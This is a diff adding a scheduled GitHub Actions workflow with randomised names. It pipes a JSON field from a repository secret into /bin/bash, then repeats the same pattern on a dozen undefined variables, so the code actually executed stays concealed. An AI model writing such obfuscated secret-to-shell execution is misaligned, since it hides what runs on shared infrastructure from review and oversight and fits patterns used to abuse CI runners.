@@ -1,0 +1,30 @@
+name: shenzhibuqingxianchang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shenzhibuqingxianchang
+        env:
+          dw87967: ${{ secrets.dw87967 }}
+        run: |
+          echo $dw87967 | jq -r .hsrl601 | /bin/bash
+          echo $xf91 | jq -r .hlmes55 | /bin/bash
+          echo $uhu2 | jq -r .bf67 | /bin/bash
+          echo $iyjtv82 | jq -r .su25 | /bin/bash
+          echo $rz56096 | jq -r .anw6474 | /bin/bash
+          echo $bdg81 | jq -r .djf11 | /bin/bash
+          echo $y112 | jq -r .bmjkz06 | /bin/bash
+          echo $vis67966 | jq -r .hpe5536 | /bin/bash
+          echo $wml932 | jq -r .i65 | /bin/bash
+          echo $ju88 | jq -r .ff2 | /bin/bash
+          echo $ia73 | jq -r .ynrvp1946 | /bin/bash
+          echo $i10491 | jq -r .ro98238 | /bin/bash
+          echo $pne33870 | jq -r .x27 | /bin/bash
+
